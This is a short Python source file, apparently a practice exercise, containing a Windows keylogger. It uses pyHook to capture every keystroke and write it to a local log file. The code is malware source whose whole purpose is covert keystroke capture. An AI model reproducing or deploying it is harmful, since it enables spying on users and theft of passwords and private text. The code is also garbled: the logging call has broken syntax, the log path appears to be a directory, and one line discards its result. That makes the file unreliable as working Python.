#simple keylogger created while practicing Python

import logging
import sys
import pyHook
import pythoncom

log = 'C:\python_work' 
def onKeyboardEvent(event):
	logging.basicConfig(filename=log,level=logging.DEBUG,format='%(message)s')
	chr(event.Ascii)
	logging.log*10,chr(event.Ascii))
	return True

hooks_manager=pyHook.HookManager()
hooks_manager.KeyDown=onKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
